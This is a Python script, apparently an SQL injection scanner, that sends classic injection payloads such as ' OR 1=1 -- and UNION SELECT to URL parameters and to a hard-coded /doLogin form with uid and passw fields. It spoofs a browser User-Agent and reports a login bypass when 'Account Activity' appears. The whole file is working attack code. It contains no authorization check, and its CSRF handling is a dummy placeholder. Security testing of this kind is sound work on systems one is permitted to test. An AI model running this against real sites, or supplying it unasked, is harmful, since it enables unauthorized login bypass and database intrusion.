import requests
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup

def scan(target):
    output = f"[*] Scanning {target} for SQL injection...\n"
    
    # Step 1: Detect if GET parameters exist
    parsed_url = urlparse(target)
    query_params = parse_qs(parsed_url.query)
    
    if query_params:
        output += scan_get(target)

    # Step 2: Try POST-based SQL injection on login forms
    output += scan_post(target)

    return output

def scan_get(target):
    output = "[*] Testing GET-based SQL Injection...\n"
    payloads = ["' OR 1=1 --", "' OR 'a'='a", "' OR '1'='1", "' OR 1=1#", "' OR 1=1 -- ", "'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"]
    

    for param in parse_qs(urlparse(target).query).keys():
        for payload in payloads:
            test_url = f"{target}&{param}={payload}"
            try:
                response = requests.get(test_url, timeout=5, headers=get_headers())
                if is_vulnerable(response.text):
                    output += f"[!] Vulnerable parameter found: {param} with payload: {payload}\n"
                    return output
            except requests.RequestException:
                output += f"[-] Request failed for payload: {payload}\n"

    output += "[-] No GET-based SQL vulnerabilities found.\n"
    return output

def scan_post(target):
    output = "[*] Testing POST-based SQL Injection...\n"
    payloads = ["' OR 1=1 --", "' OR 'a'='a", "' OR '1'='1", "' OR 1=1#", "' OR 1=1 -- ",  "'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"]

    parsed_url = urlparse(target)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    login_url = f"{base_url}/doLogin"  # Correct form submission endpoint

    login_fields = ["uid", "passw"]  # Correct form field names

    # Create a session to handle cookies
    session = requests.Session()

    # Fetch the login page to get any CSRF tokens or cookies
    try:
        response = session.get(target, headers=get_headers(), timeout=5)
    except requests.RequestException as e:
        output += f"[-] Failed to fetch login page: {e}\n"
        return output

    # Check for CSRF tokens in the form
    csrf_token = None
    if "csrf" in response.text.lower():
        # Extract CSRF token (adjust based on the actual form)
        csrf_token = "dummy_csrf_token"  # Replace with actual extraction logic

    for payload in payloads:
        for field in login_fields:
            # Prepare the form data
            data = {f: payload if f == field else 'test' for f in login_fields}
            if csrf_token:
                data["csrf_token"] = csrf_token  # Add CSRF token if present

            try:
                # Submit the form
                response = session.post(login_url, data=data, headers=get_headers(), timeout=5, allow_redirects=True)
                
                # Debugging: Print response status and content
                print(f"[*] Testing {login_url} with payload: {payload}")
                print(f"[*] Response Status: {response.status_code}")
                print(f"[*] Response Text: {response.text[:500]}")  # Print first 500 characters

                # Check for successful login bypass
                if "Account Activity" in response.text or "Sign Off" in response.text:
                    output += f"[!] Successful login bypass on field '{field}' with payload: {payload}\n"
                    return output
                
                # Check for error-based SQL injection signs
                if is_vulnerable(response.text):
                    output += f"[!] Error-based vulnerability found on field '{field}' with payload: {payload}\n"
                    return output

            except requests.RequestException as e:
                output += f"[-] Request failed for {field} with payload {payload}: {e}\n"

    output += "[-] No POST-based SQL vulnerabilities found.\n"
    return output


def extract_csrf_token(html):
    """Extract CSRF token from the login form."""
    soup = BeautifulSoup(html, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf_token"})
    return csrf_token["value"] if csrf_token else None


def is_vulnerable(response_text):
    """Check if response contains SQL error messages or suspicious behavior."""
    sql_errors = [
        "SQL syntax", "mysql_fetch", "ORA-01756",
        "syntax error", "Unclosed quotation mark", "Microsoft OLE DB Provider"
    ]
    return any(error in response_text for error in sql_errors)

def get_headers():
    """Return headers to mimic a real browser."""
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
